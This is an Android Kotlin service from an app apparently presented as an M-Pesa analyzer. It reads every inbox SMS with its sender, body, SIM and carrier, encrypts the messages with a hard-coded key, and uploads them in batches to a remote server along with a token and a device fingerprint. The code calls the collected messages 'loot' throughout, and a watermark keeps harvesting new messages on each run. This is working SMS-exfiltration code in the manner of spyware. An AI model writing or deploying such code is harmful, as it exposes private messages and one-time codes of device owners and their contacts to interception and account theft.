package com.niccher.mpesa_analyzer_app.services

import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.provider.Telephony
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.niccher.mpesa_analyzer_app.helpers.ServiceGenerator
import com.niccher.mpesa_analyzer_app.R
import com.niccher.mpesa_analyzer_app.helpers.AppPrefs
import com.niccher.mpesa_analyzer_app.helpers.DeviceFingerprint
import com.niccher.mpesa_analyzer_app.helpers.Encryptor
import com.niccher.mpesa_analyzer_app.helpers.Prefs
import com.niccher.mpesa_analyzer_app.helpers.ProgressRequestBody
import com.niccher.mpesa_analyzer_app.helpers.SyncSession
import com.niccher.mpesa_analyzer_app.api.UploadLootApiService
import com.niccher.mpesa_analyzer_app.constants.Constants
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.ResponseBody
import java.io.BufferedInputStream
import java.io.File
import java.io.FileInputStream
import java.io.FileNotFoundException
import java.io.FileOutputStream
import java.io.IOException
import java.io.InputStream

class UploadService : Service() {

    private val kon = Constants
    private val prefs = Prefs()
    private val NOTIFICATION_ID = 10101
    private val CHANNEL_PROGRESS = "SMS_UPLOAD_PROGRESS"
    private val CHANNEL_RESULT = "SMS_UPLOAD_RESULT"

    private lateinit var notificationManager: NotificationManager

    companion object {
        const val ACTION_UPLOAD_COMPLETE = "MPESA_UPLOAD_COMPLETE"
        const val EXTRA_SUCCESS = "success"
        const val EXTRA_MESSAGE = "message"
        const val EXTRA_COUNT = "sms_count"
        const val MAX_SMS_PER_BATCH = 2000
    }

    private class SmsBatch(val count: Int, val payload: StringBuffer, val maxId: Long)

    override fun onCreate() {
        super.onCreate()
        notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        createNotificationChannels()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(kon.TAGGED, "UploadService onStartCommand called")

        val notification = NotificationCompat.Builder(this, CHANNEL_PROGRESS)
            .setContentTitle("Preparing SMS Upload")
            .setContentText("Reading local SMS data…")
            .setSmallIcon(R.mipmap.app_logo)
            .setOngoing(true)
            .build()

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(
                    NOTIFICATION_ID,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
            Log.i(kon.TAGGED, "Foreground service started successfully")
        } catch (e: Exception) {
            Log.e(kon.TAGGED, "startForeground failed: ${e.message}", e)
            finishWithResult(false, "Failed to start foreground service: ${e.message}")
            return START_NOT_STICKY
        }

        Thread {
            try {
                Log.i(kon.TAGGED, "Starting upload pipeline thread")
                runUploadPipeline(this)
            } catch (t: Throwable) {
                Log.e(kon.TAGGED, "Upload pipeline crashed: ${t.message}", t)
                finishWithResult(false, "Upload crashed: ${t.message}")
            }
        }.start()

        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannels() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val progress = NotificationChannel(
                CHANNEL_PROGRESS,
                "Upload Progress",
                NotificationManager.IMPORTANCE_LOW
            )
            val result = NotificationChannel(
                CHANNEL_RESULT,
                "Upload Results",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            notificationManager.createNotificationChannel(progress)
            notificationManager.createNotificationChannel(result)
        }
    }

    private fun runUploadPipeline(context: Context) {
        Log.i(kon.TAGGED, "=== UPLOAD PIPELINE STARTED ===")

        // --- Preflight checks ---
        Log.d(kon.TAGGED, "Checking READ_SMS permission")
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            Log.e(kon.TAGGED, "FAIL: READ_SMS permission missing")
            finishWithResult(false, "SMS permission denied. Grant READ_SMS and try again.")
            return
        }
        Log.d(kon.TAGGED, "READ_SMS permission OK")

        val backendUrl = AppPrefs.getBackendUrl(context)
        Log.d(kon.TAGGED, "Backend URL from prefs: '$backendUrl'")
        if (backendUrl.isBlank()) {
            Log.e(kon.TAGGED, "FAIL: Backend URL empty")
            finishWithResult(false, "Backend URL not configured. Open Setup and set the server URL.")
            return
        }
        Log.d(kon.TAGGED, "Backend URL OK")

        val partToken = prefs.getPrefsAuth("auth", context)
        val partDevId = prefs.getPrefsAuth("print", context)
        Log.i(kon.TAGGED, "Upload preflight: token.length=${partToken.length} devId.length=${partDevId.length} url=$backendUrl")

        if (partToken.isBlank() || partToken == "nullable" || partToken.length < 8) {
            Log.e(kon.TAGGED, "FAIL: Invalid token: '$partToken'")
            finishWithResult(false, "Not linked. Open token login and scan/enter your access token.")
            return
        }
        Log.d(kon.TAGGED, "Token OK")

        if (partDevId.isBlank() || partDevId == "nullable" || partDevId.length < 8) {
            Log.e(kon.TAGGED, "FAIL: Device fingerprint missing: '$partDevId'")
            finishWithResult(
                false,
                "Device not registered. Log out and re-link with token/QR so the device fingerprint is created."
            )
            return
        }
        Log.d(kon.TAGGED, "Device ID OK")

        // --- Begin a sync session (shared UUID + attempt counter across all batches) ---
        val sessionId = SyncSession.begin(context)
        Log.i(kon.TAGGED, "Sync session=$sessionId attempt=${SyncSession.attemptNumber}")

        // --- Read _id watermark (SMS rowid cursor, clock-independent) ---
        val prefRead = context.getSharedPreferences(kon.SHARED_LAST_TIME, Context.MODE_PRIVATE)
        var watermark = prefRead.getLong(kon.SHARED_LAST_SMS_ID, -1L)
        if (watermark < 0L) {
            // First run after upgrade: seed the cursor from the old time-based watermark
            val lastUploadTime = prefRead.getString(kon.SHARED_LAST_TIME, "0")?.toLongOrNull() ?: 0L
            watermark = seedWatermarkFromTime(context, lastUploadTime)
            prefRead.edit().putLong(kon.SHARED_LAST_SMS_ID, watermark).commit()
            Log.i(kon.TAGGED, "Migrated watermark: time=$lastUploadTime -> sms_id=$watermark")
        }
        Log.i(kon.TAGGED, "Last upload _id watermark=$watermark")

        // --- Loop: fetch capped batches and upload until the inbox is drained ---
        var totalUploaded = 0
        var batchNo = 0
        while (true) {
            batchNo++
            val batch = queryInboxBatch(context, watermark)
            if (batch == null) {
                finishWithResult(false, "SMS permission blocked by system.")
                return
            }

            if (batch.count == 0) {
                val msg = if (totalUploaded == 0) {
                    "No new messages to upload."
                } else {
                    "All messages uploaded ($totalUploaded total)."
                }
                prefRead.edit()
                    .putString(kon.SHARED_LAST_TIME, System.currentTimeMillis().toString())
                    .putLong(kon.SHARED_LAST_SMS_ID, watermark)
                    .commit()
                finishWithResult(true, msg, totalUploaded)
                return
            }

            val fileName = "sms_All_${System.currentTimeMillis()}_$batchNo"
            val (ok, message) = prepareAndUpload(
                context, fileName, batch.payload, partToken, partDevId, batch.count, batchNo > 1
            )
            if (!ok) {
                finishWithResult(false, message)
                return
            }

            watermark = batch.maxId
            prefRead.edit().putLong(kon.SHARED_LAST_SMS_ID, watermark).commit()
            prefs.getFileType(fileName, System.currentTimeMillis().toString(), context)
            incrementLootCount(context)
            totalUploaded += batch.count
            Log.i(kon.TAGGED, "Batch $batchNo uploaded (${batch.count} msgs), watermark -> $watermark (total $totalUploaded)")
        }
    }

    private fun getCarrierName(context: Context, subId: Int): String {
        if (subId == -1) return "Unknown"
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            val subscriptionManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? android.telephony.SubscriptionManager
            val info = subscriptionManager?.getActiveSubscriptionInfo(subId)
            return info?.carrierName?.toString() ?: "Unknown"
        }
        return "Unknown"
    }

    private fun queryInboxBatch(context: Context, watermark: Long): SmsBatch? {
        val selection = "${Telephony.Sms._ID} > ? AND ${Telephony.Sms.TYPE} = ?"
        val selectionArgs = arrayOf(watermark.toString(), Telephony.Sms.MESSAGE_TYPE_INBOX.toString())
        val sortOrder = "${Telephony.Sms._ID} ASC LIMIT $MAX_SMS_PER_BATCH"

        val cr: ContentResolver = context.contentResolver
        val cursor = try {
            Log.d(kon.TAGGED, "Querying SMS ContentResolver (batch)...")
            cr.query(Telephony.Sms.CONTENT_URI, null, selection, selectionArgs, sortOrder)
        } catch (se: SecurityException) {
            Log.e(kon.TAGGED, "SMS query SecurityException: ${se.message}", se)
            return null
        }

        if (cursor == null) {
            Log.e(kon.TAGGED, "FAIL: SMS cursor null")
            return null
        }

        val payload = StringBuffer()
        var count = 0
        var maxId = watermark
        cursor.use { c ->
            if (c.moveToFirst()) {
                do {
                    val smsId = c.getString(c.getColumnIndexOrThrow(Telephony.Sms._ID))
                    val smsIdLong = smsId.toLongOrNull() ?: 0L
                    if (smsIdLong > maxId) maxId = smsIdLong
                    val smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE))
                    val smsNumber = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                    // NO_WRAP: DEFAULT inserts newlines that break the embedded JSON on the server
                    val smsBody = Base64.encodeToString(
                        c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY)).toByteArray(),
                        Base64.NO_WRAP
                    )
                    val smsSeen = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.SEEN))
                    val smsThreadid = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID))
                    
                    val subIdCol = c.getColumnIndex("sub_id")
                    val subId = if (subIdCol != -1) c.getInt(subIdCol) else -1
                    val carrierName = getCarrierName(context, subId)

                    payload.append(
                        "{\"Type\": \"inbox\",\"Number\": \"$smsNumber\"," +
                            "\"Thread Id\": $smsThreadid,\"Date\": $smsDate," +
                            "\"Body\": \"$smsBody\",\"Seen\": $smsSeen,\"ID\": $smsId," +
                            "\"SimSlot\": $subId,\"Carrier\": \"$carrierName\" },-------(//)--------"
                    )
                    count++
                } while (c.moveToNext())
            }
        }
        Log.i(kon.TAGGED, "Batch query: $count SMS since watermark=$watermark (maxId=$maxId)")
        return SmsBatch(count, payload, maxId)
    }

    private fun seedWatermarkFromTime(context: Context, lastUploadTime: Long): Long {
        if (lastUploadTime <= 0L) return 0L
        val cr: ContentResolver = context.contentResolver
        val projection = arrayOf("MAX(${Telephony.Sms._ID}) AS max_id")
        val selection = "${Telephony.Sms.TYPE} = ? AND ${Telephony.Sms.DATE} <= ?"
        val selectionArgs = arrayOf(Telephony.Sms.MESSAGE_TYPE_INBOX.toString(), lastUploadTime.toString())
        return try {
            cr.query(Telephony.Sms.CONTENT_URI, projection, selection, selectionArgs, null)?.use { c ->
                if (c.moveToFirst()) {
                    val idx = c.getColumnIndexOrThrow("max_id")
                    if (c.isNull(idx)) 0L else c.getLong(idx)
                } else {
                    0L
                }
            } ?: 0L
        } catch (e: Exception) {
            Log.e(kon.TAGGED, "Watermark migration query failed: ${e.message}", e)
            0L
        }
    }

    private fun incrementLootCount(context: Context) {
        val prefLootCount = context.getSharedPreferences(kon.SHARED_LOOT_COUNT, Context.MODE_PRIVATE)
        val currentCount = prefLootCount.getInt("loot_count", 0)
        val newCount = currentCount + 1
        // Use commit() to ensure write completes before broadcast
        prefLootCount.edit().putInt("loot_count", newCount).commit()
        Log.i(kon.TAGGED, "Incremented loot_count to $newCount")
    }

    private fun cryptor(inputFile: File, inputStream: InputStream) {
        Encryptor.encodeToFile(
            kon.STRING_KEY,
            inputStream,
            FileOutputStream(inputFile)
        )
        Log.e(kon.TAGGED, "Cryptor: Encryption Completed")
    }

    private fun prepareAndUpload(
        context: Context,
        fileName: String,
        dataSource: StringBuffer,
        partToken: String,
        partDevId: String,
        smsCount: Int,
        isContinuation: Boolean
    ): Pair<Boolean, String> {
        var fos: FileOutputStream? = null
        try {
            fos = context.openFileOutput("${kon.STRING_PLAIN_FILE}$fileName", Context.MODE_PRIVATE)
            fos.write(dataSource.toString().toByteArray())

            val fileEncPlain = File(context.filesDir, "/${kon.STRING_PLAIN_FILE}$fileName")
            val fileEncAes = File(context.filesDir, "/${kon.STRING_ENC_AES_FILES}$fileName")

            val fileInputStream = BufferedInputStream(FileInputStream(fileEncPlain))
            cryptor(fileEncAes, fileInputStream)

            val result = parserUpload(
                context, fileEncAes, fileName, partToken, partDevId, smsCount, isContinuation
            )

            fileEncPlain.delete()
            fileEncAes.delete()
            return result
        } catch (e: FileNotFoundException) {
            Log.e(kon.TAGGED, "Error 1  ${e.message}")
            return false to "Could not create upload file: ${e.message}"
        } catch (e: IOException) {
            Log.e(kon.TAGGED, "Error 2  ${e.message}")
            return false to "IO error preparing upload: ${e.message}"
        } catch (e: Exception) {
            Log.e(kon.TAGGED, "Encrypt/prepare error: ${e.message}", e)
            return false to "Encrypt failed: ${e.message}"
        } finally {
            try {
                fos?.close()
            } catch (_: Exception) {
            }
        }
    }

    private fun parserUpload(
        context: Context,
        files: File,
        filename: String,
        partToken: String,
        partDevId: String,
        smsCount: Int,
        isContinuation: Boolean
    ): Pair<Boolean, String> {
        Log.i(kon.TAGGED, "Starting parserUpload: file=${files.name} size=${files.length()} bytes")

        val builder = NotificationCompat.Builder(context, CHANNEL_PROGRESS)
            .setContentTitle("Uploading SMS")
            .setContentText("Upload in progress ($smsCount messages)")
            .setSmallIcon(R.mipmap.app_logo)
            .setOngoing(true)
            .setProgress(100, 0, false)

        notificationManager.notify(NOTIFICATION_ID, builder.build())

        Log.i(kon.TAGGED, "Creating Retrofit service for upload")
        val service = ServiceGenerator.createService(UploadLootApiService::class.java, context)

        val requestFile = ProgressRequestBody(files, "*/*".toMediaTypeOrNull()) { progress ->
            builder.setProgress(100, progress, false)
            notificationManager.notify(NOTIFICATION_ID, builder.build())
        }

        val body = MultipartBody.Part.createFormData("varLoot", "$filename.txt", requestFile)
        val textType = "text/plain".toMediaTypeOrNull()
        val requestBody0 = partToken.toRequestBody(textType)
        val requestBody1 = partDevId.toRequestBody(textType)
        val varBatch = (if (isContinuation) "1" else "0").toRequestBody(textType)

        Log.i(kon.TAGGED, "Enqueueing upload request to server (continuation=$isContinuation)")
        val call = service.upload(requestBody0, requestBody1, varBatch, body)

        return try {
            val response = call.execute()
            val raw = try {
                if (response.isSuccessful) {
                    response.body()?.string().orEmpty()
                } else {
                    response.errorBody()?.string().orEmpty()
                }
            } catch (e: Exception) {
                Log.e(kon.TAGGED, "Read response body failed: ${e.message}")
                ""
            }

            Log.i(kon.TAGGED, "Upload HTTP ${response.code()} body=$raw")

            if (raw.isBlank()) {
                return false to "Empty server response (HTTP ${response.code()})"
            }

            val status: Int
            val message: String
            try {
                val jsonObject = org.json.JSONObject(raw)
                status = jsonObject.optInt("status", -1)
                message = jsonObject.optString(
                    "message",
                    jsonObject.optString("error", "Unknown error")
                )
            } catch (e: Exception) {
                Log.e(kon.TAGGED, "Parse upload response error: ${e.message}", e)
                return false to "Bad server response (HTTP ${response.code()}): ${raw.take(200)}"
            }

            if (status == 1) {
                Log.i(kon.TAGGED, "Upload SUCCESS: $message")
                true to message.ifBlank { "Upload complete ($smsCount messages)" }
            } else {
                Log.e(kon.TAGGED, "Upload FAILED by server: status=$status msg=$message")
                false to message.ifBlank { "Upload failed (status=$status)" }
            }
        } catch (e: Exception) {
            Log.e(kon.TAGGED, "Upload network error: ${e.message}", e)
            false to "Network error: ${e.message}"
        }
    }

    private fun finishWithResult(success: Boolean, message: String, smsCount: Int = 0) {
        Log.i(kon.TAGGED, "Upload finish success=$success msg=$message count=$smsCount")
        SyncSession.end()
        if (success) {
            AppPrefs.setLastSyncSuccessTime(this, System.currentTimeMillis())
        }

        val channel = CHANNEL_RESULT
        val title = if (success) "Upload Complete" else "Upload Failed"
        val builder = NotificationCompat.Builder(this, channel)
            .setContentTitle(title)
            .setContentText(message)
            .setStyle(NotificationCompat.BigTextStyle().bigText(message))
            .setSmallIcon(R.mipmap.app_logo)
            .setOngoing(false)
            .setAutoCancel(true)
            .setProgress(0, 0, false)

        notificationManager.notify(NOTIFICATION_ID, builder.build())

        val intent = Intent(ACTION_UPLOAD_COMPLETE).apply {
            setPackage(packageName)
            putExtra(EXTRA_SUCCESS, success)
            putExtra(EXTRA_MESSAGE, message)
            putExtra(EXTRA_COUNT, smsCount)
        }
        sendBroadcast(intent)
        stopSelf()
    }
}
